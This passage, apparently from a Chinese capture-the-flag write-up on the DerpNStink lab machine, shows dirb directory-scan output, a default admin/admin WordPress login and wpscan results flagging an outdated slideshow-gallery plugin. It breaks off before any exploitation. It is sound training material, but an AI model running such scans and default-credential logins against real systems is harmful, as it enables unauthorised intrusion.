class="line">==&gt; DIRECTORY: http://192.168.159.136/javascript/                                            </span><br><span class="line">==&gt; DIRECTORY: http://192.168.159.136/js/                                                    </span><br><span class="line">==&gt; DIRECTORY: http://192.168.159.136/php/                                                   </span><br><span class="line">+ http://192.168.159.136/robots.txt (CODE:200|SIZE:53)                                       </span><br><span class="line">+ http://192.168.159.136/server-status (CODE:403|SIZE:295)                                   </span><br><span class="line">==&gt; DIRECTORY: http://192.168.159.136/temporary/                                             </span><br><span class="line">==&gt; DIRECTORY: http://192.168.159.136/weblog/                                                </span><br><span class="line">                                                                                             </span><br><span class="line">---- Entering directory: http://192.168.159.136/css/ ----</span><br><span class="line">                                                                                             </span><br><span class="line">---- Entering directory: http://192.168.159.136/javascript/ ----</span><br><span class="line">==&gt; DIRECTORY: http://192.168.159.136/javascript/jquery/                                     </span><br><span class="line">                                                                                             </span><br><span class="line">---- Entering directory: http://192.168.159.136/js/ ----</span><br><span class="line">                                                                                             </span><br><span class="line">---- Entering directory: http://192.168.159.136/php/ ----</span><br><span class="line">+ http://192.168.159.136/php/info.php (CODE:200|SIZE:0)                                      </span><br><span class="line">==&gt; DIRECTORY: http://192.168.159.136/php/phpmyadmin/                                        </span><br><span class="line">                                                                                             </span><br><span class="line">---- Entering directory: http://192.168.159.136/temporary/ ----</span><br><span class="line">+ http://192.168.159.136/temporary/index.html (CODE:200|SIZE:12)                             </span><br><span class="line">                                                                                             </span><br><span class="line">---- Entering directory: http://192.168.159.136/weblog/ ----</span><br><span class="line">+ http://192.168.159.136/weblog/index.php (CODE:200|SIZE:15372)                              </span><br><span class="line">==&gt; DIRECTORY: http://192.168.159.136/weblog/wp-admin/                                       </span><br><span class="line">==&gt; DIRECTORY: http://192.168.159.136/weblog/wp-content/                                     </span><br><span class="line">==&gt; DIRECTORY: http://192.168.159.136/weblog/wp-includes/                                    </span><br><span class="line">+ http://192.168.159.136/weblog/xmlrpc.php (CODE:405|SIZE:42)                                </span><br><span class="line">                                                                                             </span><br><span class="line">---- Entering directory: http://192.168.159.136/javascript/jquery/ ----</span><br><span class="line">+ http://192.168.159.136/javascript/jquery/jquery (CODE:200|SIZE:252879)                     </span><br><span class="line">+ http://192.168.159.136/javascript/jquery/version (CODE:200|SIZE:5)                         </span><br><span class="line">                                                                                             </span><br><span class="line">---- Entering directory: http://192.168.159.136/php/phpmyadmin/ ----</span><br><span class="line">+ http://192.168.159.136/php/phpmyadmin/favicon.ico (CODE:200|SIZE:18902)                    </span><br><span class="line">+ http://192.168.159.136/php/phpmyadmin/index.php (CODE:200|SIZE:8268)                       </span><br><span class="line">==&gt; DIRECTORY: http://192.168.159.136/php/phpmyadmin/js/                                     </span><br><span class="line">+ http://192.168.159.136/php/phpmyadmin/libraries (CODE:403|SIZE:306)                        </span><br><span class="line">==&gt; DIRECTORY: http://192.168.159.136/php/phpmyadmin/locale/                                 </span><br><span class="line">+ http://192.168.159.136/php/phpmyadmin/phpinfo.php (CODE:200|SIZE:8270)                     </span><br><span class="line">+ http://192.168.159.136/php/phpmyadmin/setup (CODE:401|SIZE:461)                            </span><br><span class="line">==&gt; DIRECTORY: http://192.168.159.136/php/phpmyadmin/themes/                                 </span><br><span class="line">                                                                                             </span><br><span class="line">---- Entering directory: http://192.168.159.136/weblog/wp-admin/ ----</span><br><span class="line">+ http://192.168.159.136/weblog/wp-admin/admin.php (CODE:302|SIZE:0)                         </span><br><span class="line">==&gt; DIRECTORY: http://192.168.159.136/weblog/wp-admin/css/                                   </span><br><span class="line">==&gt; DIRECTORY: http://192.168.159.136/weblog/wp-admin/images/                                </span><br><span class="line">==&gt; DIRECTORY: http://192.168.159.136/weblog/wp-admin/includes/                              </span><br><span class="line">+ http://192.168.159.136/weblog/wp-admin/index.php (CODE:302|SIZE:0)                         </span><br><span class="line">==&gt; DIRECTORY: http://192.168.159.136/weblog/wp-admin/js/                                    </span><br><span class="line">==&gt; DIRECTORY: http://192.168.159.136/weblog/wp-admin/maint/                                 </span><br><span class="line">==&gt; DIRECTORY: http://192.168.159.136/weblog/wp-admin/network/                               </span><br><span class="line">==&gt; DIRECTORY: http://192.168.159.136/weblog/wp-admin/user/                                  </span><br><span class="line">                                                                                             </span><br><span class="line">---- Entering directory: http://192.168.159.136/weblog/wp-content/ ----</span><br><span class="line">+ http://192.168.159.136/weblog/wp-content/index.php (CODE:200|SIZE:0)                       </span><br><span class="line">==&gt; DIRECTORY: http://192.168.159.136/weblog/wp-content/plugins/                             </span><br><span class="line">==&gt; DIRECTORY: http://192.168.159.136/weblog/wp-content/themes/                              </span><br><span class="line">==&gt; DIRECTORY: http://192.168.159.136/weblog/wp-content/upgrade/                             </span><br><span class="line">==&gt; DIRECTORY: http://192.168.159.136/weblog/wp-content/uploads/                             </span><br><span class="line">                                                                                             </span><br><span class="line">---- Entering directory: http://192.168.159.136/weblog/wp-includes/ ----</span><br><span class="line">==&gt; DIRECTORY: http://192.168.159.136/weblog/wp-includes/certificates/                       </span><br><span class="line">==&gt; DIRECTORY: http://192.168.159.136/weblog/wp-includes/css/                                </span><br><span class="line">==&gt; DIRECTORY: http://192.168.159.136/weblog/wp-includes/customize/                          </span><br><span class="line">==&gt; DIRECTORY: http://192.168.159.136/weblog/wp-includes/fonts/                              </span><br><span class="line">==&gt; DIRECTORY: http://192.168.159.136/weblog/wp-includes/images/                             </span><br><span class="line">==&gt; DIRECTORY: http://192.168.159.136/weblog/wp-includes/js/                                 </span><br><span class="line">==&gt; DIRECTORY: http://192.168.159.136/weblog/wp-includes/widgets/                            </span><br><span class="line">                                                                                             </span><br><span class="line">---- Entering directory: http://192.168.159.136/php/phpmyadmin/js/ ----</span><br><span class="line">==&gt; DIRECTORY: http://192.168.159.136/php/phpmyadmin/js/jquery/                              </span><br><span class="line">                                                                                             </span><br><span class="line">---- Entering directory: http://192.168.159.136/php/phpmyadmin/locale/ ----</span><br><span class="line">==&gt; DIRECTORY: http://192.168.159.136/php/phpmyadmin/locale/ar/                              </span><br><span class="line">==&gt; DIRECTORY: http://192.168.159.136/php/phpmyadmin/locale/bg/                              </span><br><span class="line">==&gt; DIRECTORY: http://192.168.159.136/php/phpmyadmin/locale/ca/                              </span><br><span class="line">==&gt; DIRECTORY: http://192.168.159.136/php/phpmyadmin/locale/cs/                              </span><br><span class="line">==&gt; DIRECTORY: http://192.168.159.136/php/phpmyadmin/locale/da/                              </span><br><span class="line">==&gt; DIRECTORY: http://192.168.159.136/php/phpmyadmin/locale/de/                              </span><br><span class="line">==&gt; DIRECTORY: http://192.168.159.136/php/phpmyadmin/locale/el/                              </span><br><span class="line">==&gt; DIRECTORY: http://192.168.159.136/php/phpmyadmin/locale/es/                              </span><br><span class="line">==&gt; DIRECTORY: http://192.168.159.136/php/phpmyadmin/locale/et/                              </span><br><span class="line">==&gt; DIRECTORY: http://192.168.159.136/php/phpmyadmin/locale/fi/                              </span><br><span class="line">==&gt; DIRECTORY: http://192.168.159.136/php/phpmyadmin/locale/fr/                              </span><br><span class="line">==&gt; DIRECTORY: http://192.168.159.136/php/phpmyadmin/locale/gl/                              </span><br><span class="line">==&gt; DIRECTORY: http://192.168.159.136/php/phpmyadmin/locale/hi/                              </span><br><span class="line">==&gt; DIRECTORY: http://192.168.159.136/php/phpmyadmin/locale/hr/                              </span><br><span class="line">==&gt; DIRECTORY: http://192.168.159.136/php/phpmyadmin/locale/hu/                              </span><br><span class="line">==&gt; DIRECTORY: http://192.168.159.136/php/phpmyadmin/locale/id/                              </span><br><span class="line">==&gt; DIRECTORY: http://192.168.159.136/php/phpmyadmin/locale/it/                              </span><br><span class="line">==&gt; DIRECTORY: http://192.168.159.136/php/phpmyadmin/locale/ja/                              </span><br><span class="line">==&gt; DIRECTORY: http://192.168.159.136/php/phpmyadmin/locale/ko/                              </span><br><span class="line">==&gt; DIRECTORY: http://192.168.159.136/php/phpmyadmin/locale/lt/                              </span><br><span class="line">==&gt; DIRECTORY: http://192.168.159.136/php/phpmyadmin/locale/nl/                              </span><br><span class="line">==&gt; DIRECTORY: http://192.168.159.136/php/phpmyadmin/locale/pl/                              </span><br><span class="line">==&gt; DIRECTORY: http://192.168.159.136/php/phpmyadmin/locale/pt/                              </span><br><span class="line">==&gt; DIRECTORY: http://192.168.159.136/php/phpmyadmin/locale/pt_BR/                           </span><br><span class="line">==&gt; DIRECTORY: http://192.168.159.136/php/phpmyadmin/locale/ro/                              </span><br><span class="line">==&gt; DIRECTORY: http://192.168.159.136/php/phpmyadmin/locale/ru/                              </span><br><span class="line">==&gt; DIRECTORY: http://192.168.159.136/php/phpmyadmin/locale/si/                              </span><br><span class="line">==&gt; DIRECTORY: http://192.168.159.136/php/phpmyadmin/locale/sk/                              </span><br><span class="line">==&gt; DIRECTORY: http://192.168.159.136/php/phpmyadmin/locale/sl/                              </span><br><span class="line">==&gt; DIRECTORY: http://192.168.159.136/php/phpmyadmin/locale/sv/                              </span><br><span class="line">==&gt; DIRECTORY: http://192.168.159.136/php/phpmyadmin/locale/th/                              </span><br><span class="line">==&gt; DIRECTORY: http://192.168.159.136/php/phpmyadmin/locale/tr/                              </span><br><span class="line">==&gt; DIRECTORY: http://192.168.159.136/php/phpmyadmin/locale/uk/                              </span><br><span class="line">==&gt; DIRECTORY: http://192.168.159.136/php/phpmyadmin/locale/zh_CN/                           </span><br><span class="line">==&gt; DIRECTORY: http://192.168.159.136/php/phpmyadmin/locale/zh_TW/                           </span><br><span class="line">                                                                                             </span><br><span class="line">---- Entering directory: http://192.168.159.136/php/phpmyadmin/themes/ ----</span><br><span class="line">==&gt; DIRECTORY: http://192.168.159.136/php/phpmyadmin/themes/original/                        </span><br><span class="line">                                                                                             </span><br><span class="line">---- Entering directory: http://192.168.159.136/weblog/wp-admin/css/ ----</span><br><span class="line">                                                                                             </span><br><span class="line">---- Entering directory: http://192.168.159.136/weblog/wp-admin/images/ ----</span><br><span class="line">                                                                                             </span><br><span class="line">---- Entering directory: http://192.168.159.136/weblog/wp-admin/includes/ ----</span><br><span class="line">+ http://192.168.159.136/weblog/wp-admin/includes/admin.php (CODE:500|SIZE:0)                </span><br><span class="line">                                                                                             </span><br><span class="line">---- Entering directory: http://192.168.159.136/weblog/wp-admin/js/ ----</span><br><span class="line">                                                                                             </span><br><span class="line">---- Entering directory: http://192.168.159.136/weblog/wp-admin/maint/ ----</span><br><span class="line">                                                                                             </span><br><span class="line">---- Entering directory: http://192.168.159.136/weblog/wp-admin/network/ ----</span><br><span class="line">+ http://192.168.159.136/weblog/wp-admin/network/admin.php (CODE:302|SIZE:0)                 </span><br><span class="line">+ http://192.168.159.136/weblog/wp-admin/network/index.php (CODE:302|SIZE:0)                 </span><br><span class="line">                                                                                             </span><br><span class="line">---- Entering directory: http://192.168.159.136/weblog/wp-admin/user/ ----</span><br><span class="line">+ http://192.168.159.136/weblog/wp-admin/user/admin.php (CODE:302|SIZE:0)                    </span><br><span class="line">+ http://192.168.159.136/weblog/wp-admin/user/index.php (CODE:302|SIZE:0)                    </span><br><span class="line">                                                                                             </span><br><span class="line">---- Entering directory: http://192.168.159.136/weblog/wp-content/plugins/ ----</span><br><span class="line">+ http://192.168.159.136/weblog/wp-content/plugins/index.php (CODE:200|SIZE:0)               </span><br><span class="line">                                                                                             </span><br><span class="line">---- Entering directory: http://192.168.159.136/weblog/wp-content/themes/ ----</span><br><span class="line">+ http://192.168.159.136/weblog/wp-content/themes/index.php (CODE:200|SIZE:0)                </span><br><span class="line">                                                                                             </span><br><span class="line">---- Entering directory: http://192.168.159.136/weblog/wp-content/upgrade/ ----</span><br><span class="line">                                                                                             </span><br><span class="line">---- Entering directory: http://192.168.159.136/weblog/wp-content/uploads/ ----</span><br><span class="line">                                                                                             </span><br><span class="line">---- Entering directory: http://192.168.159.136/weblog/wp-includes/certificates/ ----</span><br><span class="line">                                                                                             </span><br><span class="line">---- Entering directory: http://192.168.159.136/weblog/wp-includes/css/ ----</span><br><span class="line">                                                                                             </span><br><span class="line">---- Entering directory: http://192.168.159.136/weblog/wp-includes/customize/ ----</span><br><span class="line">                                                                                             </span><br><span class="line">---- Entering directory: http://192.168.159.136/weblog/wp-includes/fonts/ ----</span><br><span class="line">                                                                                             </span><br><span class="line">---- Entering directory: http://192.168.159.136/weblog/wp-includes/images/ ----</span><br><span class="line">==&gt; DIRECTORY: http://192.168.159.136/weblog/wp-includes/images/media/                       </span><br><span class="line">==&gt; DIRECTORY: http://192.168.159.136/weblog/wp-includes/images/smilies/                     </span><br><span class="line">                                                                                             </span><br><span class="line">---- Entering directory: http://192.168.159.136/weblog/wp-includes/js/ ----</span><br><span class="line">==&gt; DIRECTORY: http://192.168.159.136/weblog/wp-includes/js/jquery/                          </span><br><span class="line">+ http://192.168.159.136/weblog/wp-includes/js/swfobject.js (CODE:200|SIZE:10231)            </span><br><span class="line">==&gt; DIRECTORY: http://192.168.159.136/weblog/wp-includes/js/thickbox/                        </span><br><span class="line">==&gt; DIRECTORY: http://192.168.159.136/weblog/wp-includes/js/tinymce/                         </span><br><span class="line">                                                                                             </span><br><span class="line">---- Entering directory: http://192.168.159.136/weblog/wp-includes/widgets/ ----</span><br><span class="line">                                                                                             </span><br><span class="line">---- Entering directory: http://192.168.159.136/php/phpmyadmin/js/jquery/ ----</span><br><span class="line">                                                                                             </span><br><span class="line">---- Entering directory: http://192.168.159.136/php/phpmyadmin/locale/ar/ ----</span><br><span class="line">                                                                                             </span><br><span class="line">---- Entering directory: http://192.168.159.136/php/phpmyadmin/locale/bg/ ----</span><br><span class="line">                                                                                             </span><br><span class="line">---- Entering directory: http://192.168.159.136/php/phpmyadmin/locale/ca/ ----</span><br><span class="line">                                                                                             </span><br><span class="line">---- Entering directory: http://192.168.159.136/php/phpmyadmin/locale/cs/ ----</span><br><span class="line">                                                                                             </span><br><span class="line">---- Entering directory: http://192.168.159.136/php/phpmyadmin/locale/da/ ----</span><br><span class="line">                                                                                             </span><br><span class="line">---- Entering directory: http://192.168.159.136/php/phpmyadmin/locale/de/ ----</span><br><span class="line">                                                                                             </span><br><span class="line">---- Entering directory: http://192.168.159.136/php/phpmyadmin/locale/el/ ----</span><br><span class="line">                                                                                             </span><br><span class="line">---- Entering directory: http://192.168.159.136/php/phpmyadmin/locale/es/ ----</span><br><span class="line">                                                                                             </span><br><span class="line">---- Entering directory: http://192.168.159.136/php/phpmyadmin/locale/et/ ----</span><br><span class="line">                                                                                             </span><br><span class="line">---- Entering directory: http://192.168.159.136/php/phpmyadmin/locale/fi/ ----</span><br><span class="line">                                                                                             </span><br><span class="line">---- Entering directory: http://192.168.159.136/php/phpmyadmin/locale/fr/ ----</span><br><span class="line">                                                                                             </span><br><span class="line">---- Entering directory: http://192.168.159.136/php/phpmyadmin/locale/gl/ ----</span><br><span class="line">                                                                                             </span><br><span class="line">---- Entering directory: http://192.168.159.136/php/phpmyadmin/locale/hi/ ----</span><br><span class="line">                                                                                             </span><br><span class="line">---- Entering directory: http://192.168.159.136/php/phpmyadmin/locale/hr/ ----</span><br><span class="line">                                                                                             </span><br><span class="line">---- Entering directory: http://192.168.159.136/php/phpmyadmin/locale/hu/ ----</span><br><span class="line">                                                                                             </span><br><span class="line">---- Entering directory: http://192.168.159.136/php/phpmyadmin/locale/id/ ----</span><br><span class="line">                                                                                             </span><br><span class="line">---- Entering directory: http://192.168.159.136/php/phpmyadmin/locale/it/ ----</span><br><span class="line">                                                                                             </span><br><span class="line">---- Entering directory: http://192.168.159.136/php/phpmyadmin/locale/ja/ ----</span><br><span class="line">                                                                                             </span><br><span class="line">---- Entering directory: http://192.168.159.136/php/phpmyadmin/locale/ko/ ----</span><br><span class="line">                                                                                             </span><br><span class="line">---- Entering directory: http://192.168.159.136/php/phpmyadmin/locale/lt/ ----</span><br><span class="line">                                                                                             </span><br><span class="line">---- Entering directory: http://192.168.159.136/php/phpmyadmin/locale/nl/ ----</span><br><span class="line">                                                                                             </span><br><span class="line">---- Entering directory: http://192.168.159.136/php/phpmyadmin/locale/pl/ ----</span><br><span class="line">                                                                                             </span><br><span class="line">---- Entering directory: http://192.168.159.136/php/phpmyadmin/locale/pt/ ----</span><br><span class="line">                                                                                             </span><br><span class="line">---- Entering directory: http://192.168.159.136/php/phpmyadmin/locale/pt_BR/ ----</span><br><span class="line">                                                                                             </span><br><span class="line">---- Entering directory: http://192.168.159.136/php/phpmyadmin/locale/ro/ ----</span><br><span class="line">                                                                                             </span><br><span class="line">---- Entering directory: http://192.168.159.136/php/phpmyadmin/locale/ru/ ----</span><br><span class="line">                                                                                             </span><br><span class="line">---- Entering directory: http://192.168.159.136/php/phpmyadmin/locale/si/ ----</span><br><span class="line">                                                                                             </span><br><span class="line">---- Entering directory: http://192.168.159.136/php/phpmyadmin/locale/sk/ ----</span><br><span class="line">                                                                                             </span><br><span class="line">---- Entering directory: http://192.168.159.136/php/phpmyadmin/locale/sl/ ----</span><br><span class="line">                                                                                             </span><br><span class="line">---- Entering directory: http://192.168.159.136/php/phpmyadmin/locale/sv/ ----</span><br><span class="line">                                                                                             </span><br><span class="line">---- Entering directory: http://192.168.159.136/php/phpmyadmin/locale/th/ ----</span><br><span class="line">                                                                                             </span><br><span class="line">---- Entering directory: http://192.168.159.136/php/phpmyadmin/locale/tr/ ----</span><br><span class="line">                                                                                             </span><br><span class="line">---- Entering directory: http://192.168.159.136/php/phpmyadmin/locale/uk/ ----</span><br><span class="line">                                                                                             </span><br><span class="line">---- Entering directory: http://192.168.159.136/php/phpmyadmin/locale/zh_CN/ ----</span><br><span class="line">                                                                                             </span><br><span class="line">---- Entering directory: http://192.168.159.136/php/phpmyadmin/locale/zh_TW/ ----</span><br><span class="line">                                                                                             </span><br><span class="line">---- Entering directory: http://192.168.159.136/php/phpmyadmin/themes/original/ ----</span><br><span class="line">==&gt; DIRECTORY: http://192.168.159.136/php/phpmyadmin/themes/original/css/                    </span><br><span class="line">==&gt; DIRECTORY: http://192.168.159.136/php/phpmyadmin/themes/original/img/                    </span><br><span class="line">==&gt; DIRECTORY: http://192.168.159.136/php/phpmyadmin/themes/original/jquery/                 </span><br><span class="line">                                                                                             </span><br><span class="line">---- Entering directory: http://192.168.159.136/weblog/wp-includes/images/media/ ----</span><br><span class="line">                                                                                             </span><br><span class="line">---- Entering directory: http://192.168.159.136/weblog/wp-includes/images/smilies/ ----</span><br><span class="line">                                                                                             </span><br><span class="line">---- Entering directory: http://192.168.159.136/weblog/wp-includes/js/jquery/ ----</span><br><span class="line">==&gt; DIRECTORY: http://192.168.159.136/weblog/wp-includes/js/jquery/ui/                       </span><br><span class="line">                                                                                             </span><br><span class="line">---- Entering directory: http://192.168.159.136/weblog/wp-includes/js/thickbox/ ----</span><br><span class="line">                                                                                             </span><br><span class="line">---- Entering directory: http://192.168.159.136/weblog/wp-includes/js/tinymce/ ----</span><br><span class="line">==&gt; DIRECTORY: http://192.168.159.136/weblog/wp-includes/js/tinymce/langs/                   </span><br><span class="line">==&gt; DIRECTORY: http://192.168.159.136/weblog/wp-includes/js/tinymce/plugins/                 </span><br><span class="line">==&gt; DIRECTORY: http://192.168.159.136/weblog/wp-includes/js/tinymce/skins/                   </span><br><span class="line">==&gt; DIRECTORY: http://192.168.159.136/weblog/wp-includes/js/tinymce/themes/                  </span><br><span class="line">==&gt; DIRECTORY: http://192.168.159.136/weblog/wp-includes/js/tinymce/utils/                   </span><br><span class="line">                                                                                             </span><br><span class="line">---- Entering directory: http://192.168.159.136/php/phpmyadmin/themes/original/css/ ----</span><br><span class="line">                                                                                             </span><br><span class="line">---- Entering directory: http://192.168.159.136/php/phpmyadmin/themes/original/img/ ----</span><br><span class="line">                                                                                             </span><br><span class="line">---- Entering directory: http://192.168.159.136/php/phpmyadmin/themes/original/jquery/ ----</span><br><span class="line">==&gt; DIRECTORY: http://192.168.159.136/php/phpmyadmin/themes/original/jquery/images/          </span><br><span class="line">                                                                                             </span><br><span class="line">---- Entering directory: http://192.168.159.136/weblog/wp-includes/js/jquery/ui/ ----</span><br><span class="line">                                                                                             </span><br><span class="line">---- Entering directory: http://192.168.159.136/weblog/wp-includes/js/tinymce/langs/ ----</span><br><span class="line">                                                                                             </span><br><span class="line">---- Entering directory: http://192.168.159.136/weblog/wp-includes/js/tinymce/plugins/ ----</span><br><span class="line">==&gt; DIRECTORY: http://192.168.159.136/weblog/wp-includes/js/tinymce/plugins/hr/              </span><br><span class="line">==&gt; DIRECTORY: http://192.168.159.136/weblog/wp-includes/js/tinymce/plugins/image/           </span><br><span class="line">==&gt; DIRECTORY: http://192.168.159.136/weblog/wp-includes/js/tinymce/plugins/lists/           </span><br><span class="line">==&gt; DIRECTORY: http://192.168.159.136/weblog/wp-includes/js/tinymce/plugins/media/           </span><br><span class="line">==&gt; DIRECTORY: http://192.168.159.136/weblog/wp-includes/js/tinymce/plugins/wordpress/       </span><br><span class="line">                                                                                             </span><br><span class="line">---- Entering directory: http://192.168.159.136/weblog/wp-includes/js/tinymce/skins/ ----</span><br><span class="line">==&gt; DIRECTORY: http://192.168.159.136/weblog/wp-includes/js/tinymce/skins/wordpress/         </span><br><span class="line">                                                                                             </span><br><span class="line">---- Entering directory: http://192.168.159.136/weblog/wp-includes/js/tinymce/themes/ ----</span><br><span class="line">                                                                                             </span><br><span class="line">---- Entering directory: http://192.168.159.136/weblog/wp-includes/js/tinymce/utils/ ----</span><br><span class="line">                                                                                             </span><br><span class="line">---- Entering directory: http://192.168.159.136/php/phpmyadmin/themes/original/jquery/images/ ----</span><br><span class="line">                                                                                             </span><br><span class="line">---- Entering directory: http://192.168.159.136/weblog/wp-includes/js/tinymce/plugins/hr/ ----</span><br><span class="line">                                                                                             </span><br><span class="line">---- Entering directory: http://192.168.159.136/weblog/wp-includes/js/tinymce/plugins/image/ ----</span><br><span class="line">                                                                                             </span><br><span class="line">---- Entering directory: http://192.168.159.136/weblog/wp-includes/js/tinymce/plugins/lists/ ----</span><br><span class="line">                                                                                             </span><br><span class="line">---- Entering directory: http://192.168.159.136/weblog/wp-includes/js/tinymce/plugins/media/ ----</span><br><span class="line">                                                                                             </span><br><span class="line">---- Entering directory: http://192.168.159.136/weblog/wp-includes/js/tinymce/plugins/wordpress/ ----</span><br><span class="line">                                                                                             </span><br><span class="line">---- Entering directory: http://192.168.159.136/weblog/wp-includes/js/tinymce/skins/wordpress/ ----</span><br><span class="line">==&gt; DIRECTORY: http://192.168.159.136/weblog/wp-includes/js/tinymce/skins/wordpress/images/  </span><br><span class="line">                                                                                             </span><br><span class="line">---- Entering directory: http://192.168.159.136/weblog/wp-includes/js/tinymce/skins/wordpress/images/ ----</span><br><span class="line">                                                                               ss/images/zt  </span><br><span class="line">-----------------</span><br><span class="line">END_TIME: Mon Jul 22 16:00:33 2024</span><br><span class="line">DOWNLOADED: 424304 - FOUND: 25</span><br></pre></td></tr></table></figure><br>有一个<code>/weblog/</code>,但是我们访问的时候就变成了<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">192.168.159.136  derpnstink.local</span><br><span class="line"></span><br><span class="line">~~hosts在 /etc/hosts~~</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">访问扫描出来的各个后台，</span><br></pre></td></tr></table></figure><br><a href="http://derpnstink.local/php/phpmyadmin/">http://derpnstink.local/php/phpmyadmin/</a><br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">是一个phpmyadmin,试了试弱口令没进去，先放一下</span><br><span class="line"></span><br></pre></td></tr></table></figure><br><a href="http://derpnstink.local/weblog/wp-login">http://derpnstink.local/weblog/wp-login</a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">在这里有一个wordpress的登陆界面，经过测试发现存在admin/admin</span><br><span class="line"></span><br><span class="line">因为是wordpress的建站，所以我们用他wpscan打一下</span><br></pre></td></tr></table></figure><p>──(kali㉿kali)-[~]<br>└─$ wpscan —url <a href="http://derpnstink.local/weblog/">http://derpnstink.local/weblog/</a> </p><hr><pre><code>     __          _______   _____     \ \        / /  __ \ / ____|      \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®       \ \/  \/ / |  ___/ \___ \ / __|/ _` | &#39;_ \        \  /\  /  | |     ____) | (__| (_| | | | |         \/  \/   |_|    |_____/ \___|\__,_|_| |_|     WordPress Security Scanner by the WPScan Team                     Version 3.8.25   Sponsored by Automattic - https://automattic.com/   @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart</code></pre><hr><p>[i] It seems like you have not updated the database for some time.<br>[?] Do you want to update now? [Y]es [N]o, default: [N]y<br>[i] Updating the Database …<br>[i] Update completed.</p><p>[+] URL: <a href="http://derpnstink.local/weblog/">http://derpnstink.local/weblog/</a> [192.168.159.136]<br>[+] Started: Mon Jul 22 17:34:51 2024</p><p>Interesting Finding(s):</p><p>[+] Headers<br> | Interesting Entries:<br> |  - Server: Apache/2.4.7 (Ubuntu)<br> |  - X-Powered-By: PHP/5.5.9-1ubuntu4.22<br> | Found By: Headers (Passive Detection)<br> | Confidence: 100%</p><p>[+] XML-RPC seems to be enabled: <a href="http://derpnstink.local/weblog/xmlrpc.php">http://derpnstink.local/weblog/xmlrpc.php</a><br> | Found By: Headers (Passive Detection)<br> | Confidence: 100%<br> | Confirmed By:<br> |  - Link Tag (Passive Detection), 30% confidence<br> |  - Direct Access (Aggressive Detection), 100% confidence<br> | References:<br> |  - <a href="http://codex.wordpress.org/XML-RPC_Pingback_API">http://codex.wordpress.org/XML-RPC_Pingback_API</a><br> |  - <a href="https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/">https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/</a><br> |  - <a href="https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/">https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/</a><br> |  - <a href="https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/">https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/</a><br> |  - <a href="https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/">https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/</a></p><p>[+] WordPress readme found: <a href="http://derpnstink.local/weblog/readme.html">http://derpnstink.local/weblog/readme.html</a><br> | Found By: Direct Access (Aggressive Detection)<br> | Confidence: 100%</p><p>[+] The external WP-Cron seems to be enabled: <a href="http://derpnstink.local/weblog/wp-cron.php">http://derpnstink.local/weblog/wp-cron.php</a><br> | Found By: Direct Access (Aggressive Detection)<br> | Confidence: 60%<br> | References:<br> |  - <a href="https://www.iplocation.net/defend-wordpress-from-ddos">https://www.iplocation.net/defend-wordpress-from-ddos</a><br> |  - <a href="https://github.com/wpscanteam/wpscan/issues/1299">https://github.com/wpscanteam/wpscan/issues/1299</a></p><p>[+] WordPress version 4.6.29 identified (Outdated, released on 2024-06-24).<br> | Found By: Emoji Settings (Passive Detection)<br> |  - <a href="http://derpnstink.local/weblog/">http://derpnstink.local/weblog/</a>, Match: ‘-release.min.js?ver=4.6.29’<br> | Confirmed By: Meta Generator (Passive Detection)<br> |  - <a href="http://derpnstink.local/weblog/">http://derpnstink.local/weblog/</a>, Match: ‘WordPress 4.6.29’</p><p>[+] WordPress theme in use: twentysixteen<br> | Location: <a href="http://derpnstink.local/weblog/wp-content/themes/twentysixteen/">http://derpnstink.local/weblog/wp-content/themes/twentysixteen/</a><br> | Last Updated: 2024-07-16T00:00:00.000Z<br> | Readme: <a href="http://derpnstink.local/weblog/wp-content/themes/twentysixteen/readme.txt">http://derpnstink.local/weblog/wp-content/themes/twentysixteen/readme.txt</a><br> | [!] The version is out of date, the latest version is 3.3<br> | Style URL: <a href="http://derpnstink.local/weblog/wp-content/themes/twentysixteen/style.css?ver=4.6.29">http://derpnstink.local/weblog/wp-content/themes/twentysixteen/style.css?ver=4.6.29</a><br> | Style Name: Twenty Sixteen<br> | Style URI: <a href="https://wordpress.org/themes/twentysixteen/">https://wordpress.org/themes/twentysixteen/</a><br> | Description: Twenty Sixteen is a modernized take on an ever-popular WordPress layout — the horizontal masthead …<br> | Author: the WordPress team<br> | Author URI: <a href="https://wordpress.org/">https://wordpress.org/</a><br> |<br> | Found By: Css Style In Homepage (Passive Detection)<br> |<br> | Version: 1.3 (80% confidence)<br> | Found By: Style (Passive Detection)<br> |  - <a href="http://derpnstink.local/weblog/wp-content/themes/twentysixteen/style.css?ver=4.6.29">http://derpnstink.local/weblog/wp-content/themes/twentysixteen/style.css?ver=4.6.29</a>, Match: ‘Version: 1.3’</p><p>[+] Enumerating All Plugins (via Passive Methods)<br>[+] Checking Plugin Versions (via Passive and Aggressive Methods)</p><p>[i] Plugin(s) Identified:</p><p>[+] slideshow-gallery<br> | Location: <a href="http://derpnstink.local/weblog/wp-content/plugins/slideshow-gallery/">http://derpnstink.local/weblog/wp-content/plugins/slideshow-gallery/</a><br> | Last Updated: 2024-06-11T19:04:00.000Z<br> | [!] The version is out of date, the latest version is 1.8.2<br> |<br> | Found By: Urls In Homepage (Passive Detection)<br> |<br> | Version: 1.4.6 (80% confidence)<br> | Found By: Readme - Stable Tag (Aggressive Detection)<br> |  - <a href="http://derpnstink.local/weblog/wp-content/plugins/slideshow-gallery/readme.txt">http://derpnstink.local/weblog/wp-content/plugins/slideshow-gallery/readme.txt</a></p><p>[+] 